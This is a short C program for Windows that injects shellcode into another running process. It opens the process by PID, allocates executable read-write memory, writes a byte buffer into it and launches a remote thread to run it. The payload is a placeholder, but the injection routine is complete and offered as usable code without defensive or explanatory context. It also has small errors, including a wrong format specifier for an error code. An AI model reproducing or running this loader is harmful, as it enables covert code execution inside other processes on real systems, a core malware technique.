#include <windows.h>
#include <stdio.h>

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char shellCode[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		printf("Usage: program.exe <PID>");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("Trying to open a handle to process (%ld)\n", PID);

	/* OPEN PROCESS */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL)
	{
		printf("Couldn't get a handle to the process: (%ld)\nError: %ld\n", PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("got a handle to the process!\n\\---0x%p\n", hProcess);

	/* ALLOCATE BYTES TO PROCESS MEMORY */
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("allocated %zu-bytes with rwx permission", sizeof(shellCode));

	/* WRITE IN MEMORY */
	WriteProcessMemory(hProcess, rBuffer, shellCode, sizeof(shellCode), NULL);
	printf("Wrote %zu-bytes to process memory\n", sizeof(shellCode));

	/* CREATE A THREAD TO RUN OUR PAYLOAD */
	hThread = CreateRemoteThreadEx
	(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID
	);

	if (hThread == NULL)
	{
		printf("Faild to get a handler to the thread.\nERRO: %s", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("Got a handle to the thread (%ld)\n\\---0x%p\n", TID, hThread);
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return EXIT_SUCCESS;
}